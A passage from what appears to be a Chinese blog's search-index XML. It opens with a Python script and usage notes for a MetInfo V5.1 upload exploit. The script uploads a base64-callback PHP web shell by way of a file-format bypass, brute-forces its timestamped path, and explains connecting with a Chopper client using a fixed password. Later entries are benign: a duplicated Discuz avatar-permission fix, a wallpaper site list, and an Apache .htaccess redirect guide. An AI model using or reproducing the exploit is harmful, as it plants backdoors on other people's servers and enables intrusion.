&#123;'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'&#125;urls = Queue.Queue()#http://hb.jhxjd.com/upload/file/1441445378.phpdef bp(urls,time_out): while not urls.empty(): base_url = urls.get() response = None try: time.sleep(int(time_out))#延时设置 response = requests.get(base_url,headers=headers) if response.status_code == 404: print 'Not Fount----%s\n' % base_url except: continue finally: if response: with open('url.txt','a+') as f: f.write('%s?e=YXNzZXJ0\n'%base_url)def main(target_url,thread_num,time_out): #取出当前时间戳并删除后四位 now = str(int(time.time()))[:-4] #将所有的待爆破地址遍历并加入队列 for i in range(0,10): for j in range(100,1000): num_str = ''.join((str(i),str(j))) url = ''.join(('%s/upload/file/%s' % (target_url,now),num_str,'.php')) urls.put(url) #上传文件 with open('xiaoma.php','w+') as fi: fi.write("&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;") data = &#123; 'fd_para[1][para]':'filea', 'fd_para[1][type]':'5' &#125; files = &#123;'filea': open("xiaoma.php", 'rb')&#125; upload_url = '%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo' % target_url res = requests.post(upload_url,data = data,files=files) #等待两秒 文件上传 time.sleep(2) #启动多线程 for i in range(int(thread_num)): t = threading.Thread(target = bp,args=(urls,time_out,)) t.start()if __name__ == '__main__': if len(sys.argv) != 4: print 'Example : %s http://www.xxx.com 20 0' % sys.argv[0] else: main(sys.argv[1],sys.argv[2],sys.argv[3]) 程序略显粗糙 为了方便，我也把他打包成了exe 然后闲着没事，想着简单地给他做了个界面,这样的 文件说明 MetInfo V5.1上传漏洞getshell利用工具 作者 : Akkuman 漏洞原理详见http://www.wooyun.org/bugs/wooyun-2010-0139168 使用说明：本目录有两个文件，一个py，一个exe因为exe是py文件打包而成，故文件较大64位系统测试使用通过 如果你安装了py2.x环境 py文件使用方法打开cmdpython baopo.py http://www.xxx.com 20 020是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定 exe命令行文件使用方法打开cmdbaopo.exe http://www.xxx.com 20 020是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定 GUI程序，应该不用说 关于getshell与结果上传的是回调一句话木马12&gt; &lt;?php &gt;$e=$_REQUEST['e'];register_shutdown_function(base64_decode($e),$_&gt;REQUEST['Akkuman']);?&gt;&gt; 菜刀连接，密码是Akkuman 爆破结果会生成在url.txt 下载地址： (访问码:1475) 转载请注明出处 作者博客 hacktech.cn | 53xiaoshuo.com]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder]]></title>
      <url>%2F2016%2F05%2F31%2Fdiscuz%20%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E6%8F%90%E7%A4%BAcan%20not%20write%20to%20the%20datatmp%20folder.html</url>
      <content type="text"><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder 解释：disucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。 解决办法：首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder]]></title>
      <url>%2F2016%2F05%2F31%2FDZ%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E6%8F%90%E7%A4%BA%E4%B8%8D%E8%83%BD%E5%86%99%E5%85%A5data-tmp%E7%9B%AE%E5%BD%95.html</url>
      <content type="text"><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder 解释：disucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。 解决办法：首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Many Website Of WallPaper]]></title>
      <url>%2F2016%2F05%2F31%2FMany%20Website%20Of%20WallPaper.html</url>
      <content type="text"><![CDATA[我在这里给大家推荐几个不错的壁纸网站 毕竟一张赏心悦目的壁纸能让你的工作效率提高不少 注意前方高能 一大波网站即将来袭 一系列 如你所见 alphacoders wallpaperdj Wallhaven(推荐) wallpaperswa eweb4 wallls topwallpapers wallpaperfo wallpapermay picstopin wallpaperup wall321 wallsave wallpaperswide desktopnexus goodfon vladstudio(推荐) simpledesktops(极简) interfacelift kuvva switch-box gde-fon bingimages wallpaper4k(推荐) feelgrafix facets(元素块构图) justinmaller(略抽象) 7-themes superhd fondos7 forwallpaper(推荐) 大B站的动漫壁纸，二次元可选 就推荐到这里吧，基本上是搜刮别人的答案而来，自己都有看过]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[lamp服务器被人恶意绑定域名的解决办法]]></title>
      <url>%2F2016%2F05%2F28%2Flamp%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E4%BA%BA%E6%81%B6%E6%84%8F%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
      <content type="text"><![CDATA[还没开始就被别人绑定了域名事情的起因与发现刚买了个服务器搭建了一个dz，想着域名还没备案，就先搭建了起来，然后在做DDOS测试时偶然发现服务器被别人恶意把域名绑定了 最初的解决方案没管。。。。。。后来发现有影响，朋友也一直给我说叫我整下 利用重定向把恶意指向过来的域名指到别处要利用301重定向，首先我们要在Apache上配置一下，Apache默认是不开启.htaccess的 0x01.编辑httpd.conf文件打开/etc/httpd/conf目录下的httpd.conf文件，找到这一行：1LoadModule rewrite_module modules/mod_rewrite.so 当然，你得确定你的/etc/httpd/modules下有mod_rewrite.so这个文件12&gt; ls /etc/httpd/modules | grep mod_rewrite&gt; 如果你没有找到这一行，记得在httpd.conf文件里直接添加这一行 0x02.设置AllowOverride同样的在httpd.conf文件中找到：123456789101112131415161718192021222324252627&lt;Directory "/var/www/html"&gt; # # Possible values for the Options directive are "None", "All", # or any combination of: # Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews # # Note that "MultiViews" must be named *explicitly* --- "Options All" # doesn't give it to you. # # The Options directive is both complicated and important. Please see # http://httpd.apache.org/docs/2.4/mod/core.html#options # for more information. # Options Indexes FollowSymLinks # # AllowOverride controls what directives may be placed in .htaccess files. # It can be "All", "None", or any combination of the keywords: # Options FileInfo AuthConfig Limit # AllowOverride All # # Controls who can get stuff from this server. # Require all granted&lt;/Directory&gt; 或者它长这个样子：1234&lt;Directory /&gt;Options FollowSymLinksAllowOverride None&lt;/Directory&gt; 什么，你告诉我还是找不到？？？那教你一个办法锁定关键词FollowSymLinks和AllowOverride None vi的向下查找命令是:/你要查找的vi的向上查找命令是:?你要查找的n是下一个N是上一个 相信你已经找到了接下来把None改成All 0x03.编写规则文件.htaccess跑去网站根目录下，比如我的是/var/www/html如果存在.htaccess，忽略下一步，直接打开编辑然后新建.htaccess文件touch .htaccess编辑.htaccess文件vi .htaccess添加如下规则1234RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]RewriteCond %&#123;HTTP_HOST&#125; ^www.别人的域名.com$RewriteRule ^(.*)$ http://www.自己的域名.com/$1 [R=301,L] 个人的修改我知道，你在网上所找到的方法都是上面那种代码，并且应该都没有提 教你怎么开启.htaccess但是本人实验过，这配置进去还有问题，设置重启Apache后，访问网站提示500错误机智的我总要查看日志啊1cat /var/log/messages | grep httpd 找到了错误英语不太好，但是大致知道是服务器没有限定域名，需要修改ServerName,而ServerName字段值在httpd.conf中是被注释掉的我们在httpd.conf修改它1#ServerName: www.example.com:80 改为1ServerName: 115.**.**.57:80 然后重启Apache，可以访问了 后续好的故事都会有后续的 以为这样就万事大吉了? 但是我这个被坑得不轻admin.xx.com都被他解析到我服务器上来了 老衲怎么破.htaccess好像可以用正则表达式，一查，果然那就改一下.htaccess咯1234RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]RewriteCond %&#123;HTTP_HOST&#125; ^.*.别人的域名.com$RewriteRule ^(.*)$ http://www.自己的域名.com/$1 [R=301,L] 机智的你已经发现第三行中的www被我改成了.，就是匹配0个或者多个字符，当然你可以改成+ 然后重启Apache 1systemctl restart httpd 或者1service httpd restart 现在我再访问。。。嘿嘿嘿，被我跳转到百度了 思考当然，还有其他的方法，自己也可以去网上找找对了，那个刚才在httpd.conf里换ip的地方也可换自己的域名，因为我的还在备案，就没改]]></content>
    </entry>

    
  
  
</search>
